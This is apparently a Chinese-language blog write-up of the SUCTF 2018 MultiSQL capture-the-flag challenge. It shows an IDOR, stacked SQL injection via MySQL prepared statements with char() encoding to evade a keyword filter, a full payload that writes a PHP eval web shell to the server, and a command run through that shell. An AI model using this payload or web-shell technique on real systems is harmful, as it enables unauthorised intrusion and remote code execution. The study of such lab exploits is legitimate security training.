---
title: '[SUCTF 2018]MultiSQL'
date: 2024-08-18 20:00:14
tags:    
     - 题解
     - sql注入
categories: 刷题笔记
---

### [SUCTF 2018]MultiSQL(mysql预处理)

我们打开页面源码，找到登录，注册页面

![image-20240818200624899](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408182006003.png)

先进行注册，再登录

<!--more-->

![image-20240818200704555](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408182007713.png)

我们发现可以编辑头像，但上传上去的文件全被改为jpg格式，排除文件上传，我们点击用户信息

![image-20240818200808148](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408182008237.png)

id=2那里可以随意更改，存在越权，1就是admin

![image-20240818200832974](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408182008150.png)

我们考虑sql注入，我们使用[mysql的预处理](https://www.cnblogs.com/jierong12/p/8882534.html)

set

```
MariaDB [(none)]> set @a='select version()';
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]> select @a;
+------------------+
| @a               |
+------------------+
| select version() |
+------------------+

```

set的作用就是定义一个变量，变量的命名必须是@开头



prepare和execute

prepare语句用于预定义一个语句，不可以指定预定义语句名称。execute则是执行预定义语句

```
prepare prepare_name from “sql语句”

execute prepare_name

```

结合起来利用就是

```
MariaDB [(none)]> set @a='select version()';
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]> prepare t from @a;
Query OK, 0 rows affected (0.00 sec)
Statement prepared

MariaDB [(none)]> execute t;
+-------------------+
| version()         |
+-------------------+
| 10.1.29-MariaDB-6 |
+-------------------+
1 row in set (0.00 sec)

```

这题通过fuzz测试后发现过滤了union、select，&，|,过滤了select然后存在堆叠注入的可以使用预处理注入，尝试写入shell，因为过滤了select等字符，使用char()绕过，需要执行的语句

```
select ‘<?php eval($_POST[_]);?>’ into outfile ‘/var/www/html/favicon/shell.php’;

```

使用脚本编程十进制：

```
str="select '<?php eval($_POST[_]);?>' into outfile '/var/www/html/favicon/shell.php';"
len_str=len(str)
for i in range(0,len_str):
	if i == 0:
		print('char(%s'%ord(str[i]),end="")
	else:
		print(',%s'%ord(str[i]),end="")
print(')')

//char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)

```

payload

```
?id=2;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query;

```

利用该payload写入shell

![image-20240818201807447](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408182018604.png)

访问shell.php的位置进行rce

```
_=system("cat ../../../../WelL_Th1s_14_fl4g");
```

